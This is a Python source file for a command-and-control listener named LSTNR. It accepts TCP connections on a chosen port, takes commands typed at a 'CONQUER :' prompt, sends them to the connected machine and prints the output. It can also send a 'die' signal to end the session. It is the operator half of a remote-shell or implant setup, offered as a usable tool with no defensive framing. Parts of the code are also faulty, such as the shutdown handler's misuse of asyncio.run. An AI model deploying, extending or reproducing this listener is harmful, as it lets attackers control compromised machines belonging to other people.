import asyncio
import signal
import sys
import argparse
from datetime import datetime

# Global variables
current_session = None
current_writer = None

def parse_arguments():
    parser = argparse.ArgumentParser(description='LSTNR - Remote Command & Control')
    parser.add_argument('-p', '--port', type=int, required=True, help='Port to listen on')
    return parser.parse_args()

async def handle_client(reader, writer):
    global current_session, current_writer
    addr = writer.get_extra_info('peername')
    client_ip = addr[0]

    try:
        print(f"\n[+] New connection from {client_ip}")
        current_session = client_ip
        current_writer = writer

        while True:
            try:
                command = input("\nCONQUER : ")
                if command.lower() == 'kill-session':
                    print("[!] Terminating session...")
                    writer.write(b"die\n")
                    await writer.drain()
                    break

                if not command.strip():
                    continue

                writer.write(f"{command}\n".encode())
                await writer.drain()

                response = ""
                while True:
                    chunk = await reader.read(4096)
                    if not chunk:
                        break
                    response += chunk.decode('utf-8')

                    # Check for EOF marker
                    if "EOF" in response:
                        response = response.replace("EOF", "").strip()
                        break

                print(f"\n[Response from {client_ip}]:")
                print(response)
            except EOFError:
                print("[!] EOF Error. Exiting session.")
                break
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print(f"\n[!] Connection from {client_ip} closed")
        writer.close()
        await writer.wait_closed()
        current_session = None
        current_writer = None

async def start_server(port):
    server = await asyncio.start_server(handle_client, '0.0.0.0', port)
    print("""
    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v1.0
    """)
    print(f"[*] LSTNR running on port {port}")
    print("[*] Waiting for connections...")
    print("[*] Use Ctrl+C to exit the listener")
    print("[*] Type 'kill-session' to terminate a connected session")
    
    async with server:
        await server.serve_forever()

def signal_handler(sig, frame):
    print("\n[!] Shutting down...")
    if current_writer:
        asyncio.run(current_writer.write(b"die\n"))
    sys.exit(0)

if __name__ == "__main__":
    args = parse_arguments()
    signal.signal(signal.SIGINT, signal_handler)
    asyncio.run(start_server(args.port))
